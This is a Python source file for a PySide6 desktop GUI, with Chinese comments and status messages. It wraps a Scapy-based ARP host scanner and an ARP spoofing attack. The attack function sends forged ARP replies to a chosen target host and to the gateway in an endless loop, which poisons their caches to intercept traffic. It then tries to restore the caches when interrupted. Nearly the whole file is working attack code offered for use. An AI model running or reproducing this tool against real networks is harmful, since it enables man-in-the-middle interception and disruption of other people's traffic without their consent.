import sys
from PySide6.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton
from PySide6.QtCore import Qt
from Ui_imitate_UI import Ui_Form
from scapy.all import *
from scapy.layers.l2 import getmacbyip


class ARPAttackGUI(QMainWindow, Ui_Form):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.bind()

    def bind(self):
        self.attack_button.clicked.connect(self.Arp_attack)
        self.scan_button.clicked.connect(self.Scan_hosts)
        
    def Scan_hosts(self):
        interface = self.interface_edit.text()
        ip = conf.route.route("0.0.0.0")[2]
        # 使用 split() 方法将 IP 地址按 "." 分割成四个部分
        parts = ip.split(".")
        # 提取前三个部分作为前半段 IP 地址
        ip_parts = ".".join(parts[:3])
        
        p=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=f"{ip_parts}.1/24")
        ans,unans=srp(p,timeout=2,iface=interface)
        
        # print("一共扫描到%d台主机："%len(ans))
        self.Description_text.append(f"一共扫描到{len(ans)}台主机：")
        result=[]
        for s,r in ans:
            result.append([r[ARP].psrc,r[ARP].hwsrc])
        result.sort()
        for ip,mac in result:
            # print(ip,"----->",mac)
            self.Description_text.append(f"{ip} -----> {mac}")
            QApplication.processEvents()

    def Arp_attack(self):
        interface = self.interface_edit.text()
        gateway_ip = self.gateway_edit.text()
        target_ip = self.target_edit.text()

        # 设置网卡
        conf.iface = interface  
        # 关闭提示信息
        conf.verb = 0

        # 获取网关MAC
        gateway_mac = getmacbyip(gateway_ip)
        if gateway_mac is None:
            # print("[!] 获取网关MAC失败. Exiting")
            self.Description_text.append(f"[!] 获取网关MAC失败. Exiting")
            QApplication.processEvents()
            return

        # 获取目标主机MAC
        target_mac = getmacbyip(target_ip)
        if target_mac is None:
            # print("[!] 获取目标主机MAC失败. Exiting")
            self.Description_text.append(f"[!] 获取目标主机MAC失败. Exiting")
            QApplication.processEvents()
            return

        # 进行欺骗
        self.attack_target(gateway_ip, gateway_mac, target_ip, target_mac)

    def attack_target(self, gateway_ip, gateway_mac, target_ip, target_mac):
        # 欺骗目标主机
        poison_target = ARP()
        poison_target.op = 2
        poison_target.psrc = gateway_ip
        poison_target.pdst = target_ip
        poison_target.hwdst = target_mac

        # 欺骗网关
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = target_ip
        poison_gateway.pdst = gateway_ip
        poison_gateway.hwdst = gateway_mac

        # print("[*] 正在进行ARP攻击. [Ctrl-C 停止进行]")
        self.Description_text.append(f"[*] 正在进行ARP攻击. [Ctrl-C 停止进行]")
        QApplication.processEvents()

        while True:
            try:
                # 循环发送ARP包
                send(poison_target)
                send(poison_gateway)
                # 推迟执行，避免过于频繁影响网络
                time.sleep(2)

            except KeyboardInterrupt:
                # 进行ARP缓冲恢复
                self.restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
                break
        # print("[*] ARP攻击结束")
        self.Description_text.append(f"[*] ARP攻击结束")
        QApplication.processEvents()

    def restore_target(self, gateway_ip, gateway_mac, target_ip, target_mac):
        # print("[*] 恢复arp缓冲")
        self.Description_text.append(f"[*] 恢复arp缓冲")
        QApplication.processEvents()

        send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
        send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac))


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = ARPAttackGUI()
    window.show()
    sys.exit(app.exec())
